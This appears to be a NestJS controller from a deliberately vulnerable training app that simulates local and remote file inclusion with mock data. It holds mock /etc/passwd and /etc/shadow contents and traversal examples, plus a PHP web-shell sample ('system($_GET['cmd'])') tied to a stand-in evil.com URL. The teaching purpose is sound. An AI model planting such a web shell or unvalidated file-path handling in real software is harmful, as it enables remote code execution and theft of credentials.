import { Controller, Get, Query } from '@nestjs/common';
import { ApiOperation, ApiTags } from '@nestjs/swagger';

/**
 * INTENTIONAL VULNERABILITY: Simulated LFI/RFI Demonstration
 * 
 * This controller demonstrates Local File Inclusion (LFI) and Remote File Inclusion (RFI)
 * vulnerabilities in a SAFE, controlled manner using mock data only.
 * 
 * SECURITY NOTE: This is for training purposes only. In a real application:
 * - Never trust user input for file paths
 * - Use whitelist of allowed files
 * - Validate and sanitize all paths
 * - Never allow remote URLs
 * - Use proper file system abstractions
 */

// Mock file system data - simulating what would be exposed in a real LFI vulnerability
const MOCK_FILESYSTEM: Record<string, string> = {
  '/etc/passwd': `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/sh`,

  '/etc/hosts': `127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
fe00::0 ip6-mcastprefix
fe00::1 ip6-allnodes
fe00::2 ip6-allrouters
10.0.46.108     demon-slayers-container`,

  '/etc/shadow': `root:$6$rounds=656000$...:19131:0:99999:7:::
daemon:*:19131:0:99999:7:::
bin:*:19131:0:99999:7:::
sys:*:19131:0:99999:7:::
sync:*:19131:0:99999:7:::
games:*:19131:0:99999:7:::
man:*:19131:0:99999:7:::
lp:*:19131:0:99999:7:::
mail:*:19131:0:99999:7:::
news:*:19131:0:99999:7:::
node:$6$rounds=656000$...:19131:0:99999:7:::`,
  
  '/proc/version': `Linux version 6.1.115-126.197.amzn2023.x86_64 (mock@buildhost) (gcc (GCC) 11.4.0, GNU ld version 2.38-5.amzn2023.0.1) #1 SMP PREEMPT_DYNAMIC Tue Nov  5 17:36:57 UTC 2024`,

  '/proc/cpuinfo': `processor       : 0
vendor_id       : GenuineIntel
cpu family      : 6
model           : 85
model name      : Intel(R) Xeon(R) Platinum 8175M CPU @ 2.50GHz
stepping        : 4
cpu MHz         : 2500.000
cache size      : 33792 KB`,

  '/etc/environment': `PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"`,

  'config.json': `{
  "database": {
    "host": "postgres",
    "port": 5432,
    "name": "bc",
    "user": "bc",
    "password": "bc"
  },
  "jwt": {
    "secret": "123",
    "algorithm": "HS256"
  }
}`,

  'application.properties': `server.port=3000
database.url=jdbc:postgresql://postgres:5432/bc
database.username=bc
database.password=bc
jwt.secret=123`
};

// Mock remote file responses - simulating what would be fetched in a real RFI vulnerability
const MOCK_REMOTE_FILES: Record<string, string> = {
  'https://evil.com/shell.php': `<?php
// This is a simulated malicious PHP file
// In real RFI, this would execute on the server
echo "RFI Vulnerability Exploited";
system($_GET['cmd']);
?>`,
  
  'https://attacker.com/config.json': `{
  "malicious": true,
  "payload": "This would be executed in real RFI"
}`,
  
  'http://internal-service.local/secrets': `SECRET_KEY=compromised_secret_key
API_KEY=stolen_api_key`
};

@Controller('/api/file')
@ApiTags('File operations (Simulated LFI/RFI)')
export class LfiRfiController {
  
  @Get('/lfi')
  @ApiOperation({ 
    description: 'Simulated Local File Inclusion (LFI) - Returns mock file contents. SAFE: Uses predefined mock data only, no real filesystem access.' 
  })
  async simulateLfi(@Query('path') path: string): Promise<{ content: string; path: string; warning: string }> {
    // INTENTIONAL VULNERABILITY: Simulated LFI
    // In a real LFI vulnerability, user input would be used directly to read files
    // This endpoint simulates that behavior using mock data only
    
    // INTENTIONAL: No path validation or sanitization
    // Secure approach:
    // 1. Whitelist allowed file paths
    // 2. Prevent directory traversal (../)
    // 3. Use absolute paths with base directory
    // 4. Validate file extensions
    // 5. Never allow user input in file paths
    
    if (!path) {
      return {
        content: 'No path provided. Example: /api/file/lfi?path=/etc/passwd',
        path: '',
        warning: 'This is a simulated LFI vulnerability for training purposes only.'
      };
    }

    // INTENTIONAL: Simulating path traversal attacks
    // Real LFI would allow: ../../etc/passwd, ..%2F..%2Fetc%2Fpasswd, etc.
    // This simulation uses a predefined map instead of real filesystem
    
    // Normalize path (simulating what a vulnerable app might do)
    const normalizedPath = path.replace(/\.\./g, '').replace(/\/\//g, '/');
    
    // Check mock filesystem
    const content = MOCK_FILESYSTEM[path] || MOCK_FILESYSTEM[normalizedPath] || 
      `[SIMULATED] File not found: ${path}\n\nThis is mock data for training. In a real LFI vulnerability, this might expose:\n- System configuration files\n- Application source code\n- Environment variables\n- User credentials\n\nSecure approach: Never use user input for file paths without strict validation.`;

    return {
      content,
      path: path,
      warning: '⚠️ SIMULATED LFI: This uses mock data only. In real LFI, this would expose actual system files.'
    };
  }

  @Get('/rfi')
  @ApiOperation({ 
    description: 'Simulated Remote File Inclusion (RFI) - Returns mock remote file contents. SAFE: Uses predefined mock data only, no real remote requests.' 
  })
  async simulateRfi(@Query('url') url: string): Promise<{ content: string; url: string; warning: string }> {
    // INTENTIONAL VULNERABILITY: Simulated RFI
    // In a real RFI vulnerability, user-provided URLs would be fetched and executed
    // This endpoint simulates that behavior using mock data only
    
    // INTENTIONAL: No URL validation
    // Secure approach:
    // 1. Never allow remote URLs
    // 2. Whitelist allowed domains
    // 3. Validate URL scheme (reject http/https)
    // 4. Use Content Security Policy
    // 5. Never execute remote content
    
    if (!url) {
      return {
        content: 'No URL provided. Example: /api/file/rfi?url=https://evil.com/shell.php',
        url: '',
        warning: 'This is a simulated RFI vulnerability for training purposes only.'
      };
    }

    // INTENTIONAL: Simulating remote file inclusion
    // Real RFI would fetch and execute: https://evil.com/shell.php, file:///etc/passwd, etc.
    // This simulation uses a predefined map instead of making real HTTP requests
    
    const content = MOCK_REMOTE_FILES[url] || 
      `[SIMULATED] Remote file not found: ${url}\n\nThis is mock data for training. In a real RFI vulnerability, this might:\n- Execute malicious code from remote servers\n- Include attacker-controlled scripts\n- Expose internal network resources\n- Lead to remote code execution\n\nSecure approach: Never include or execute files from remote URLs.`;

    return {
      content,
      url: url,
      warning: '⚠️ SIMULATED RFI: This uses mock data only. In real RFI, this would fetch and potentially execute remote files.'
    };
  }

  @Get('/include')
  @ApiOperation({ 
    description: 'Simulated File Inclusion (LFI/RFI) - Handles both local and remote paths. SAFE: Uses mock data only.' 
  })
  async simulateFileInclusion(
    @Query('path') path?: string,
    @Query('url') url?: string
  ): Promise<{ content: string; source: string; warning: string }> {
    // INTENTIONAL VULNERABILITY: Simulated file inclusion
    // This endpoint simulates a vulnerable application that accepts both local paths and remote URLs
    // Real vulnerability would allow: include($_GET['file']) or similar
    
    if (url) {
      // Simulate RFI
      const rfiResult = await this.simulateRfi(url);
      return {
        content: rfiResult.content,
        source: `remote: ${url}`,
        warning: rfiResult.warning
      };
    }
    
    if (path) {
      // Simulate LFI
      const lfiResult = await this.simulateLfi(path);
      return {
        content: lfiResult.content,
        source: `local: ${path}`,
        warning: lfiResult.warning
      };
    }

    return {
      content: 'Provide either ?path= for LFI or ?url= for RFI',
      source: 'none',
      warning: 'This is a simulated file inclusion vulnerability for training purposes only.'
    };
  }
}

